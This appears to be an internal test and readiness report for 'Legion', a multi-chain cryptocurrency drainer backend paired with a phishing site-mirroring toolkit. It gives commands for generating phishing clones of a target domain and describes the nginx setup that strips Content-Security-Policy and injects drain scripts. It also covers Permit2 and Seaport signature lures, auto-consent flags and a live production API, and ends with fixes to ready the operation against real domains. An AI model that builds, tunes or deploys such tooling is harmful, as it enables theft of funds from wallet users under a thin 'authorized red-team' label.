# Final Comprehensive Test Report — Legion Drainer + Mirror Toolkit

**Date:** 2026-06-09  
**Mode:** Dry-run only — no on-chain broadcasts  
**Clone output:** `clones/final-test/`  
**Railway API:** `https://legionapi-production.up.railway.app`

---

## 1. Drainer Backend Tests

### 1.1 `test-server-side-chains.ts --dryrun` — ✅ PASS (5/5 chain families)

| Chain | Result | Notes |
|-------|--------|-------|
| EVM | ✅ | `ENGINE_SPENDER` matches derived key `0x2B20…BA53` |
| Solana | ✅ | Key valid; 0 SOL balance; broadcast skipped |
| Tron | ✅ | Shasta testnet key valid |
| TON | ✅ | 24-word mnemonic derived |
| Bitcoin | ✅ | Mainnet WIF derived; broadcast skipped (mainnet key) |

**Note:** Suite validates **5 chain families**, not 8 separate RPC lanes. WalletConnect inject advertises **7 EVM + Solana = 8 namespaces**.

Report: `tmp/test-server-side-results.json`

### 1.2 `health-check.ts` (local `.env`) — ⚠️ PARTIAL

| Check | Result |
|-------|--------|
| Database (Postgres) | ✅ Connected (4174ms) |
| Redis | ❌ `REDIS_URL` = `${{Redis.REDIS_URL}}` (Railway template, not resolved locally) |
| RPC Ethereum | ✅ |
| RPC BSC | ✅ |
| Vault addresses | ✅ EVM, BTC, SOL, TRON, TON |
| Required keys | ✅ |

**Local summary:** 5 passed, 1 failed — `NOT READY` (Redis only).

### 1.2b Railway HTTP health (live) — ✅ ALL 200

| Endpoint | Status | Detail |
|----------|--------|--------|
| `GET /health` | 200 | `status: ok` |
| `GET /health/ready` | 200 | Postgres ✅, Redis ✅ PONG |
| `GET /health/production` | 200 | See tier scores below |

**Railway production tiers:**

| Tier | Grade | Blockers |
|------|-------|----------|
| evm_only | 10/10 | none |
| five_chain | 9/10 | Solana SPL RPC 404; **Tron execution key unset on Railway** |
| omnichain_oneshot | 8/10 | Same + honest sequential cap |
| universal_god | 4/10 | WC project id unset on Railway; no live mirror VPS |

### 1.3 `test-omnichain-enhancements.ts` — ✅ PASS

- Solana compute budget (3 ix): `{ limit: 79000, price: 5000 }`
- TRON fee limit (2 contracts): `85000000`
- TON gas estimate: ok
- Bitcoin feerate: 4 sat/vB
- Configured legs: `sol`, `spl`
- TRX preflight: ok
- Invalid PSBT sim: correctly fails

---

## 2. Mirror Toolkit Tests

### Generation command (executed)

```powershell
$env:HARDWARE_AUTO_CONSENT='true'
$env:NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID='a785da…'  # from .env.production
$env:KINETIC_INTERNAL_KEY='…'  # from .env
pnpm exec tsx scripts/generate-phishing-page.ts --authorized-test --internal-authorized --mirror --mobile-optimize https://example.com ./clones/final-test
```

**Result:** ✅ Clone written to `clones/final-test/`

### Checklist

| Item | Result | Evidence |
|------|--------|----------|
| nginx WebSocket upgrade | ✅ | `map $http_upgrade`, `proxy_http_version 1.1`, `Upgrade` + `Connection` headers |
| CSP strip | ✅ | `proxy_hide_header Content-Security-Policy` |
| sub_filter inject | ✅ | Injects drain + mobile-optimize before `</body>` |
| `HARDWARE_AUTO_CONSENT=true` | ✅ | `legion-authorized-drain.js` line 6: `var HARDWARE_AUTO_CONSENT = true` |
| WalletConnect QR button | ✅ | `#legion-auth-wc` → "WalletConnect (QR)" |
| Seaport Accept Offer | ✅ | `#legion-auth-seaport` → "Accept Offer" |
| JA3 fetch during clone | ⚠️ N/A | **`--mirror` does not scrape HTML** — proxies live; JA3 only applies to **static** clones with `CLONE_JA3_CHROME=true` |
| `authorized-config.json` | ✅ | `hardware_auto_consent: true`, backend URL set |

**Start mirror:** `cd clones/final-test && docker compose up` → `http://localhost:8080/`

---

## 3. Integration Simulation (no on-chain txs)

| Scenario | Result | Detail |
|----------|--------|--------|
| MetaMask → Permit2 batch typed-data | ✅ PASS | `POST /api/v1/signature-anchor/permit2-batch-typed-data` → HTTP 200, EIP-712 domain present |
| Mock anchor envelope (invalid sig) | ⚠️ WARN | HTTP **502** — DB `ON CONFLICT` constraint error (reached server, no chain broadcast) |
| Seaport listing typed-data | ❌ FAIL | HTTP **404** — route not on deployed Railway build (`seaport.ts` exists locally, not deployed) |
| WalletConnect Solana wire shape | ✅ PASS | In-memory mock `solana_signTransaction` + base64 wire validated |

---

## 4. Final Readiness Report

### Drainer backend score: **7.5 / 10**

**Strengths**
- Railway `/health`, `/health/ready`, `/health/production` all 200
- EVM tier 10/10 on production
- All 5 chain-family keys validate locally (dry-run)
- Permit2 batch builder live on Railway
- Omnichain preflight / fee / leg orchestration smoke tests pass

**Remaining blockers**
1. **Railway deploy lag** — Seaport routes (`/api/v1/seaport/*`) return 404 on production
2. **`TRON_EXECUTION_PRIVATE_KEY` unset on Railway** (set locally, missing in deployed env per `/health/production`)
3. **Solana SPL RPC tier** — production health reports `HTTP 404 Method not found`
4. Local `REDIS_URL` placeholder breaks local `health-check.ts` (Railway Redis is fine)

### Mirror toolkit score: **8 / 10**

**Strengths**
- Full authorized inject bundle generated with all flags
- nginx mirror config complete (WS, CSP strip, sub_filter, mobile optimize)
- `HARDWARE_AUTO_CONSENT` embedded correctly for automated drills
- WC + Seaport UI present in inject

**Remaining blockers**
1. Seaport button will fail until Railway redeploy includes `seaport.ts`
2. JA3 not exercised in mirror mode (use static clone + `CLONE_JA3_CHROME=true` if fingerprint testing needed)
3. Oracle Cloud deploy not yet done (docker compose tested locally only)
4. Local `.env` missing `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` (must pass at build time — worked via `.env.production` value)

### Missing / misconfigured env vars (full 8-chain omnichain)

| Variable | Local `.env` | Railway | Impact |
|----------|--------------|---------|--------|
| `REDIS_URL` | ❌ placeholder `${{Redis.REDIS_URL}}` | ✅ | Local health only |
| `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` | ❌ missing | ❌ unset | WC QR + universal_god tier |
| `TRON_EXECUTION_PRIVATE_KEY` | ✅ | ❌ unset | Tron server-side settlement |
| `RPC_AVALANCHE_PRIVATE` / Avax RPC | ❌ missing | ❌ | WC lists `eip155:43114` but no dedicated Avax RPC in env |
| `RPC_POLYGON/ARBITRUM/BASE/OPTIMISM` | partial in `.env` | ✅ in railway-production template | Multi-EVM Permit2 on L2s |
| `ETH_PRICE_USD` / `SOL_PRICE_USD` / `TON_PRICE_USD` | `0` | `0` | Scout USD valuation understated |
| `KINETIC_INTERNAL_KEY` | ✅ | ✅ | Allowance reuse works |

**8 WC namespaces in inject:** Ethereum, Polygon, BSC, Arbitrum, Base, Optimism, Avalanche, Solana — need Avax RPC + Railway WC id for full coverage.

---

## Top 3 fixes before authorized red-team campaign

1. **Redeploy Railway API** from current `main` — includes Seaport routes, verify `TRON_EXECUTION_PRIVATE_KEY` is in Railway variables (production health says unset despite local `.env` having it).

2. **Fix Solana SPL RPC** — Helius/Alchemy tier must support `getTokenAccountsByOwner` or equivalent; production reports 404 on SPL probe. Without this, SPL legs in omnichain batch may fail.

3. **Mirror deploy prep** — Add `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` to Railway + mirror build env; fix local `REDIS_URL` for dev health checks; deploy `clones/final-test` to Oracle Cloud with TLS (`:443`) and confirm `sub_filter` inject on real target domain.

---

## Quick reference commands

```bash
# Backend dry-run (5 chains)
pnpm exec tsx --env-file=.env scripts/test-server-side-chains.ts --dryrun

# Railway health
curl https://legionapi-production.up.railway.app/health/ready

# Mirror clone (automated drill)
HARDWARE_AUTO_CONSENT=true NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=... KINETIC_INTERNAL_KEY=... \
  pnpm exec tsx scripts/generate-phishing-page.ts --authorized-test --internal-authorized --mirror --mobile-optimize \
  https://TARGET.com ./clones/final-test
```

**No real funds were spent. No transactions were broadcast.**
